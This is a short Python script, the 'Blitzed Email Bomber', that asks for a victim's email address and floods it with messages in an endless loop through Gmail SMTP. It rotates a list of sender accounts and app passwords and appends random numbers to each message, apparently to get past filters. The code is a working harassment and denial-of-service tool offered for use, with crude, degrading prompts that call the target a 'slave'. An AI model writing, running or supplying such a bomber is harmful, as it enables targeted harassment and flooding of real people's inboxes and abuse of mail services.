import random
import smtplib, ssl
import keyboard

banner = """
┌┐ ┬  ┬┌┬┐┌─┐┌─┐┌┬┐
├┴┐│  │ │ ┌─┘├┤  ││
└─┘┴─┘┴ ┴ └─┘└─┘─┴┘

Welcome to Blitzed Email Bomber.

Please input your slave.

root@blitzed:~# """

addr = "smtp.gmail.com"
port = 587
context = ssl.create_default_context()

emails = [
    "your-email@gmail.com:your-app-password"
]

message = """\
Subject: Touched by Blitzed Bomber

Hi. This tool was made by Cozmic @ https://github.com/ripcozmic. """

def send(receiver: str):
    try:
        parts = random.choice(emails).split(':')
        mail, password = parts[0], parts[1]

        print(mail, password)

        server = smtplib.SMTP(addr, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(mail, password)

        txt = message + str(random.randint(1, 999999999))

        server.sendmail(mail, receiver, txt)
    except Exception as e:
        print(e)

    finally:
        server.quit()

def main():
    print(banner)
    slave = input()

    print("Diddler has been freed... Press X to cancel.")

    while True:
        try:
            if keyboard.is_pressed('x'):
                return
            send(slave)
        except Exception as e:
            print(e)

if __name__ == "__main__":
    main()